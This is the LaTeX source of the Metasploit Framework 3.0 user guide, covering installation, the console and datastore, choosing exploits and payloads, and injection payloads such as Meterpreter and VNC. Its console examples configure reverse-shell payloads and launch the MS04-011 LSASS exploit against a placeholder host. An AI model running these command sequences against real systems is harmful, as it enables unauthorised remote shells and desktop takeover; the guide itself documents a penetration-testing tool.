%%
% This file is part of the Metasploit Framework.
%%

%
%   Title: Metasploit Framework User Guide
% Version: $Revision: 4068 $
%

\documentclass{report}
\usepackage{graphicx}
\usepackage{color}
\usepackage{amsmath}
\usepackage[colorlinks,urlcolor=blue,linkcolor=black,citecolor=blue]{hyperref}

\begin{document}

\title{Metasploit Framework User Guide}
\author{metasploit.com}

\begin{titlepage}
    \begin{center}
        		
        \huge{Metasploit Framework User Guide}
		\ \\[10mm]
		\large{Version 3.0}
		\\[120mm]
		
        \small{\url{http://www.metasploit.com/}}

        \rule{10cm}{1pt} \\[4mm]
        \renewcommand{\arraystretch}{0.5}
    \end{center}
\end{titlepage}

\tableofcontents

\setlength{\parindent}{0pt} \setlength{\parskip}{8pt}


\chapter{Introduction}

\par
This is the official user guide for version 3.0 of the Metasploit Framework. This 
guide is designed to provide an overview of what the framework is, how it works,
and what you can do with it. The latest version of this document can be found
on the Metasploit Framework web site. 

\par
The Metasploit Framework is a platform for writing, testing, and using exploit code.
The primary users of the Framework are professionals performing penetration testing,
shellcode development, and vulnerability research.

\par
\pagebreak

\chapter{Installation}

    \section{Installation on Unix}
    \label{INSTALL-UNIX}
\par
Installing the Framework is as easy as extracting the tarball, changing into the
created directory, and executing your preferred user interface. We strongly
recommend that you use a version of the Ruby interpreter that was built with
support for the GNU Readline library. If you are using the Framework on Mac OS
X, you will need to install GNU Readline and the recompile the Ruby
interpreter.  Using a version of Ruby with Readline support enables tab-based
completion.  The \texttt{msfconsole} user interface is preferred for everyday
use.

\par
To perform a system-wide installation, we recommend that you copy the entire
Framework directory into a globally accessible location (/usr/local/msf) and
then create symbolic links from the msf* applications to a directory in the
system path (/usr/local/bin). User-specific modules can be placed into
\texttt{HOME/.msf3/modules} directory.  The structure of this directory should
mirror that of the global modules directory found in the framework
distribution.

    \section{Installation on Windows}
    \label{INSTALL-WIN32}

\par
TBD
   
    \section{Platform Caveats}
    \label{INSTALL-CAVEAT}

\par
TBD

    \section{Supported Operating Systems}
    \label{INSTALL-SUPPORT}

\par
The Framework should run on almost any Unix-based operating system that includes
a complete and modern version of the Ruby interpreter (1.8.2+). Every stable
version of the Framework is tested with four primary platforms: 

\begin{itemize}
\item Linux (x86, ppc) (2.4, 2.6)
\item Windows NT (4.0, 2000, XP, 2003)
\item BSD (Open 3.x, Free 4.6+)
\item MacOS X (10.3.x)
\end{itemize}

    \section{Updating the Framework}
    \label{INSTALL-UPDATE}

\par
The Framework can be updated using a standard \texttt{Subversion} client. The
old \texttt{msfupdate} tool has been replaced with a stub program in this
version and should no longer be used. To obtain the latest updates, change
into the Framework installation directory and execute \texttt{svn update}. If
you are accessing the internet through a HTTP proxy server, please see the
Subversion FAQ on proxy access: \url{http://subversion.tigris.org/faq.html#proxy}

\pagebreak

\chapter{Getting Started}

    \section{The Console Interface}
    \label{STARTED-CONSOLE}

\par
After you have installed the Framework, you should verify that everything is
working correctly.  The easiest way to do this is to execute the
\texttt{msfconsole} user interface. This interface should display an ASCII art
logo, print the current version, some module counts, and
drop to a "msf> " prompt. From this prompt, type \texttt{help} to get a list of
valid commands. You are currently in the "main" mode; this allows you to list
exploits, list payloads, and configure global options.  To list all available
exploits, type \texttt{show exploits}. To obtain more information about a given
exploit, type \texttt{info module\_name}. 

\par
The \texttt{msfconsole} interface was designed to be flexible and fast. If you
enter a command that is not recognized by the console, it will scan the system
path to determine if it is a system command. If it finds a match, that
command will be executed with the supplied arguments. This allows you to use
your standard set of tools without having to leave the console. We highly
recommend that you enable tab completion support, this is included by default in
the Windows package, but may require software installation for other operating
systems. For more information on tab completion, please refer to appendix
\ref{REF-TAB}.

\par
The \texttt{msfconsole} startup will similar to the text below.

\begin{verbatim}

                 o                       8         o   o
                 8                       8             8
ooYoYo. .oPYo.  o8P .oPYo. .oPYo. .oPYo. 8 .oPYo. o8  o8P
8' 8  8 8oooo8   8  .oooo8 Yb..   8    8 8 8    8  8   8
8  8  8 8.       8  8    8   'Yb. 8    8 8 8    8  8   8
8  8  8 `Yooo'   8  `YooP8 `YooP' 8YooP' 8 `YooP'  8   8
..:..:..:.....:::..::.....::.....:8.....:..:.....::..::..:
::::::::::::::::::::::::::::::::::8:::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::


       =[ msf v3.0-beta-dev
+ -- --=[ 179 exploits - 104 payloads
+ -- --=[ 18 encoders - 5 nops
       =[ 29 aux

msf >            
\end{verbatim}

    \section{The Command Line Interface}
    \label{STARTED-CLI}

\par
If you are looking for a way to automate exploit testing, or simply do not want
to use an interactive interface, then \texttt{msfcli} may be the solution. This
interface takes a module name as the first parameter, followed by the options
in a VAR=VAL format, and finally an action code to specify what should be done.
The module name is used to determine which exploit or auxiliary module you
want to launch.

\par
The action code is a single letter; S for summary, O for options, A for advanced
options, I for IDS evasions, P for payloads, T for targets, AC for auxiliary
actions, C to try a vulnerability check, and E to exploit. The saved
datastore will be loaded and used at startup, allowing you to configure
convenient default options in the Global or module-specific datastore of
\texttt{msfconsole}, save them, and take advantage of them in the
\texttt{msfcli} interface. 

    \section{The Web Interface}
    \label{STARTED-WEB}

\par
TBD

\pagebreak
\chapter{The DataStore}

\par
The datastore system is a core component of the Framework.  The interfaces use
it to configure settings, the payloads use it patch opcodes, the exploits
use it to define parameters, and it is used internally to pass options between
modules.  There are two types of datastores.  First, there is a single global
datastore that can be accessed using the \texttt{setg} and \texttt{unsetg}
commands from \texttt{msfconsole}.  Second, each module instance has its own
datastore in which arbitrary options or parameters can be stored.  For
example, when the \texttt{RHOST} option is set, its value is stored in the
datastore of the module instance that it was set relative to.  In the event
that an option was not set in a module instance's datastore, the framework
will consult the global datastore to see if it was set there.

    \section{Global DataStore}
    \label{ENV-GLOBAL}
\par
The Global datastore is accessed through the console via the \texttt{setg} and
\texttt{unsetg} commands. The following example shows the Global datastore
state after a fresh installation. Calling \texttt{setg} with no arguments
displays the current global datastore. Default settings are automatically
loaded when the interface starts.

\begin{verbatim}
msf > setg

Global
======

No entries in data store.

\end{verbatim}

    \section{Module DataStore}
    \label{ENV-TEMP}
\par

The module datastore is accessed through the \texttt{set} and \texttt{unset}
commands. This datastore only applies to the currently loaded module;
switching to another module via the \texttt{use} command will result in the
module datastore for the current module being swapped out with the datastore
of the new module. If no module is currently active, the \texttt{set} and
\texttt{unset} commands will operate on the global datastore. Switching back
to the original module will initialize a new datastore for the module.  To
persist the contents of either the global or module-specific datastores, the
\texttt{save} command should be used.

    \section{Saved DataStore}
    \label{ENV-SAVE}

\par
The \texttt{save} command can be used to synchronize the Global and all module
datastores to disk. The saved environment is written to
\texttt{HOME/.msf3/config} and will be loaded when any of the user interfaces
are executed.  

    \section{DataStore Efficiency}
    \label{ENV-EFF}

\par
This split datastore system allows you save time during exploit development
and penetration testing. Common options between exploits can be defined in the
Global datastore once and automatically used in any exploit you load thereafter.  

\par
The example below shows how the \texttt{LPORT}, \texttt{LHOST}, and
texttt{PAYLOAD} global datastore can be used to save time when exploiting a
set of Windows-based targets. If this datastore was set and a Linux exploit
was being used, the module datastore (via \texttt{set} and \texttt{unset})
could be used to override these defaults.  

{\footnotesize
\begin{verbatim}
f > setg LHOST 192.168.0.10
LHOST => 192.168.0.10
msf > setg LPORT 4445
LPORT => 4445
msf > setg PAYLOAD windows/shell/reverse_tcp
PAYLOAD => windows/shell/reverse_tcp
msf > use windows/smb/ms04_011_lsass
msf exploit(ms04_011_lsass) > show options

Module options:

...

Payload options:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, process
   LHOST     192.168.0.10     yes       The local address
   LPORT     4445             yes       The local port

...

\end{verbatim}}

    \section{DataStore Variables}
    \label{ENV-VAR}
\par
The datastore can be used to configure many aspects of the Framework, ranging
from user interface settings to specific timeout options in the network socket
API. This section describes the most commonly used environment variables.  

\par
For a complete listing of all environment variables, please see the file
Environment.txt in the ``documentation'' subdirectory of the Framework. 

	\subsection{LogLevel}
\par
This variable is used to control the verbosity of log messages provided
by the components of the Framework.  If this variable is not set, framework
logging is disabled.  Setting this variable to 0 will turn on default log
messages.  A value of 1 will enable additional, non-verbose log messages that
may be helpful in troubleshooting.  A value of 2 will enable verbose debug
logging.  A value of 3 will enable all logging and may generate a large amount
of log messages.  Only use this when much additional information is required.

\pagebreak

\chapter{Using the Framework}

	\section{Choosing an Exploit Module}
\par
From the \texttt{msfconsole} interface, you may view the available exploit
modules through with the \texttt{show exploits} command. Select an exploit
with the \texttt{use} command, specifying the short module name as the
argument. The \texttt{info} command can be used to view information about a
specific exploit module. 

	\section{Configuring the Active Exploit}

\par Once you have selected an exploit, the next step is to determine what
options it requires. This can be accomplished with the \texttt{show options}
command. Most exploits use \texttt{RHOST} to specify the target address and
\texttt{RPORT} to set the target port. Use the \texttt{set} command to
configure the appropriate values for all required options. If you have any
questions about what a given option does, refer to the module source code.
Advanced options are available with some exploit modules, these can be viewed
with the \texttt{show advanced} command. 

	\section{Verifying the Exploit Options}

\par	The \texttt{check} command can be used to determine whether the target
system is vulnerable to the active exploit module. This is a quick way to
verify that all options have been correctly set and that the target is
actually vulnerable to exploitation. Not all exploit modules have implemented
the check functionality.  In many cases it is nearly impossible to determine
whether a service is vulnerable without actually exploiting it. A
\texttt{check} command should never result in the target system crashing or
becoming unavailable. Many modules simply display version information and
expect you to analyze it before proceeding.  

	\section{Selecting a Target}

\par Many exploits will require the \texttt{TARGET} environment variable to be
set to the index number of the desired target. The \texttt{show targets}
command will list all targets provided by the exploit module. Many exploits
will default to a brute-force target type; this may not be desirable in all
situations. 

	\section{Selecting the Payload}

\par	The payload is the actual code that will run on the target system after
a successful exploit attempt. Use the \texttt{show payloads} command to list
all payloads compatible with the current exploit. If you are behind a
firewall, you may want to use a bind shell payload, if your target is behind
one and you are not, you would use a reverse connect payload. You can use the
\texttt{info payload\_name} command to view detailed information about a given
payload.  

\par
Once you have decided on a payload, use the \texttt{set} command to specify
the payload module name as the value for the \texttt{PAYLOAD} environment
variable. Once the payload has been set, use the \texttt{show options} command
to display all available payload options. Most payloads have at least one
required option. Advanced options are provided by a handful of payload
options; use the \texttt{show advanced} command to view these. Please keep in
mind that you will be allowed to select any payload compatible with that
exploit, even if it not compatible with your currently selected
\texttt{TARGET}. For example, if you select a Linux target, yet choose a BSD
payload, you should not expect the exploit to work.

	\section{Launching the Exploit}

\par The \texttt{exploit} command will launch the attack. If everything went
well, your payload will execute and potentially provide you with an
interactive command shell on the exploited system. 

\pagebreak
\chapter{Advanced Features}

\par
This section covers some of the advanced features that can be found in this
release. These features can be used in any compatible exploit and highlight
the strength of developing attack code using an exploit framework. 

\section{The Meterpreter}
\par
The Meterpreter is an advanced multi-function payload that can be dynamically
extended at run-time. In normal terms, this means that it provides you with a
basic shell and allows you to add new features to it as needed. Please refer
to the Meterpreter documentation for an in-depth description of how it works
and what you can do with it. The Meterpreter manual can be found in the
``documentation'' subdirectory of the Framework as well as online at:

\url{http://metasploit.com/projects/Framework/docs/meterpreter.pdf}

\section{PassiveX Payloads}

\par Starting with the 2.4 release, the Metasploit Framework can be used to
load arbitrary ActiveX controls into a target process. This feature works by
patching the registry of the target system and causing the exploited process
to launch internet explorer with a URL pointing back to the Framework. The
Framework starts up a simple web server that accepts the request and sends
back a web page instructing it to load an ActiveX component. The exploited
system then downloads, registers, and executes the ActiveX. 

\par
The basic PassiveX payload, \texttt{windows/xxx/reverse\_http}, supports any
custom ActiveX that you develop. In addition to the base payload, three other
PassiveX modules are included in the Framework. These can be used to execute a
command shell, load the Meterpreter, or inject a VNC service. When any of
these three payloads are used, the PassiveX object will emulate a TCP
connection through HTTP GET and POST requests. This allows you to interact
with a command shell, VNC, or the Meterpreter using nothing but standard HTTP
traffic.

\par
Since PassiveX uses the Internet Explorer browser to load the ActiveX
component, it will pass right through an outbound web proxy, using whatever
system and authentication settings that have already been configured. The
PassiveX system included in 2.4 will only work when the target system has
Internet Explorer 6.0 or newer installed. Future versions may work around this
limitation. For more information about PassiveX, please see the Uninformed
Journal article titled "Post-Exploitation on Windows using ActiveX Controls",
located online at:

\url{http://www.uninformed.org/?v=1&a=3&t=pdf}

\section{Chainable Proxies}
\par
The Framework includes transparent support for TCP proxies, this release has
handler routines for HTTP CONNECT and SOCKSv4 servers. To use a proxy with a
given exploit, the \texttt{Proxies} environment variable needs to be set. The value of
this variable is a comma-separated list of proxy servers, where each server is
in the format type:host:port. The type values are 'http' for HTTP CONNECT and
'socks4' for SOCKS v4. The proxy chain can be of any length; testing shows that
the system was stable with over five hundred SOCKS and HTTP proxies configured
randomly in a chain. The proxy chain only masks the exploit request, the
automatic connection to the payload is not relayed through the proxy chain at
this time. 

\section{Win32 UploadExec Payloads}
\par
Although Unix systems normally include all of the tools you need for
post-exploitation, Windows systems are notoriously lacking in a decent command
line toolkit. The UploadExec payloads included in this release allow you to
simultaneously exploit a Windows system, upload your favorite tool, and execute
it, all across the payload socket connection. When combined with a
self-extracting rootkit or scripting language interpreter (perl.exe!), this can
be a very powerful feature. The Meterpreter payloads are usually much better
suited for penetration testing tasks.  

\section{Win32 DLL Injection Payloads}
\par
Starting with version 2.2, the Framework includes a staged payload that is
capable of injecting a custom DLL into memory in combination with any Win32
exploit. This payload will not result in any files being written to disk; the
DLL is loaded directly into memory and is started as a new thread in the
exploited process. This payload was developed by Jarkko Turkulainen and Matt
Miller and is one of the most powerful post-exploitation techniques developed
to date. To create a DLL which can be used with this payload, use the
development environment of choice and build a standard Win32 DLL. This DLL
should export an function called Init which takes a single argument, an
integer value which contains the socket descriptor of the payload connection.
The Init function becomes the entry point for the new thread in the exploited
process. When processing is complete, it should return and allow the loader
stub to exit the process according to the \texttt{EXITFUNC} environment
variable. If you would like to write your own DLL payloads, refer to the
src/shellcode/win32/dllinject directory in the Framework. 

\section{VNC Server DLL Injection}
\par
One of the first DLL injection payloads developed was a customized VNC server.
This server was written by Matt Miller and based on the RealVNC source code.
Additional modifications were made to allow the server to work with exploited,
non-interactive network services. This payload allows you to immediately access
the desktop of an exploited system using almost any Win32 exploit. The DLL is
loaded into the remote process using any of the staged loader systems, started
up as a new thread in the exploited process, and the listens for VNC client
requests on the same socket used to load the DLL. The Framework simply listens
on a local socket for a VNC client and proxies data across the payload
connection to the server.  

\par
The VNC server will attempt to obtain full access to the current interactive
desktop. If the first attempt fails, it will call RevertToSelf() and then try
the attempt again. If it still fails to obtain full access to this desktop, it
will fall back to a read-only mode. In read-only mode, the Framework user can
view the contents of the desktop, but not interact with it. If full access was
obtained, the VNC server will spawn a command shell on the desktop with the
privileges of the exploited service. This is useful in situations where an
unprivileged user is on the interactive desktop, but the exploited service is
running with System privileges.  

\par
If there is no interactive user logged into the system or the screen has been
locked, the command shell can be used to launch explorer.exe anyways. This can
result in some very confused users when the logon screen also has a start menu.
If the interactive desktop is changed, either through someone logging into the
system or locking the screen, the VNC server will disconnect the client. Future
versions may attempt to follow a desktop switch. 

\par
To use the VNC injection payloads, specify the full path to the VNC server as
the value of the \texttt{DLL} option. The VNC server can be found in the data
subdirectory of the Framework installation and is named 'vncdll.dll'. The source
code of the DLL can be found in the src/shellcode/win32/dllinject/vncinject
subdirectory of the Framework installation. 

\par
As of the 2.4 release, there are a few situations where the VNC inject payload
will simply not work. These problems are often cause by strange execution
environments or other issues related to a specific exploit or injection method.
These issues will be addressed as time permits:
\begin{itemize}
	\item The cabrightstor\_uniagent exploit will cause the VNC payload to
	crash, possibly due to a strange heap state.
	\item The executables generated by \texttt{msfpayload}'s 'X' option are not
	will cause the VNC payload to crash after spawning the command shell.
\end{itemize}

\begin{verbatim}
msf > use lsass_ms04_011
msf lsass_ms04_011 > set RHOST some.vuln.host
RHOST -> some.vuln.host
msf lsass_ms04_011 > set PAYLOAD win32_reverse_vncinject
PAYLOAD -> win32_reverse_vncinject
msf lsass_ms04_011(win32_reverse_vncinject) > set LHOST your.own.ip
LHOST -> your.own.ip
msf lsass_ms04_011(win32_reverse_vncinject) > set LPORT 4321
LPORT -> 4321
msf lsass_ms04_011(win32_reverse_vncinject) > exploit
\end{verbatim}

If the "vncviewer" application is in your path and the AUTOVNC option has been
set (it is by default), the Framework will automatically open the VNC desktop.
If you would like to connect to the desktop manually, \texttt{set AUTOVNC 0}, then use
vncviewer to connect to 127.0.0.1 on port 5900. 

\pagebreak
\chapter{More Information}


\section{Web Site}
\par
The metasploit.com web site is the first place to check for updated modules and
new releases. This web site also hosts the Opcode Database and a decent shellcode
archive.  

\section{Mailing List}
\par
You can subscribe to the Metasploit Framework mailing list by sending a blank
email to framework-subscribe[at]metasploit.com. This is the preferred way to
submit bugs, suggest new features, and discuss the Framework with other users.
The mailing list archive can be found online at:
\url{http://metasploit.com/archive/framework/threads.html}

\section{Developers}
\par
If you are interested in helping out with the Framework project, or have any
questions related to module development, please contact the development team. The
Metasploit Framework development team can be reached at msfdev[at]metasploit.com.

\pagebreak
\appendix

\pagebreak
\chapter{Security}

\par
We recommend that you use a robust, secure terminal emulator when
utilizing the command-line interfaces. Examples include \texttt{konsole},
\texttt{gnome-terminal}, and recent versions of \texttt{PuTTY}.

\par
We do not recommend that the \texttt{msfweb} interface be used on untrusted
networks. Actually, we don't recommend that you use msfweb at all, it is
more of a proof-of-concept than a real tool.



	\section{Console Interfaces}
\par
The console does not perform terminal escape sequence filtering, this
could allow a hostile network service to do Bad Things (TM) to your terminal
emulator when the exploit or check commands are used. We suggest that you
use a terminal emulator which limits the functionality available through
hostile escape sequences. Please see the Terminal Emulator Security Issues paper
below for more information on this topic:

\url{http://www.digitaldefense.net/labs/papers/Termulation.txt}


	\section{Web Interface}
\par
The \texttt{msfweb} interface does not adequately filter certain arguments,
allowing a hostile web site operator to perform a cross-site scripting
attack on the \texttt{msfweb} user.

\par
The \texttt{msfweb} interface does not provide any access control functionality. If
the service is configured to listen on a different interface (default is
loopback), a malicious attacker could abuse this to exploit remote systems
and potentially access local files. The local file access attack can be
accomplished by malicious arguments to the payloads which use a local file
as input and then exploiting a (fake) service to obtain the file contents.
	

\pagebreak
\chapter{General Tips}


	\section{Tab Completion}
	\label{REF-TAB}
\par
TBD
	\section{Secure Socket Layer}
	\label{REF-SSL}
\par
TBD

\pagebreak
\chapter{Cygwin}
\label{CYGWIN}	
	
\par
TBD

\pagebreak
\chapter{Licenses}

\par
TBD

\end{document}
